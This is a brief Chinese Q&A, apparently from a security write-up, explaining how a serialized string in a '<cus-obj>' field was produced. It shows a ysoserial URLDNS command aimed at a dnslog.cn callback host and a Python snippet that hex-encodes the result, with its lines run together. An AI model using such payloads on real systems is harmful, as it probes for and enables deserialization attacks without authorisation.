Q：<cus-obj>的一串是怎么来的？

A：那个串是用ysoserial的URLDNS利用链生成的，命令如下：

java -jar ysoserial.jar URLDNS http://7cz05y.dnslog.cn > 11.ot

再利用脚本将生成的11.ot解码转换成hex如下：

import binascii
filename = '11.ot'with open(filename, 'rb') as f:    content = f.read()print(binascii.hexlify(content))
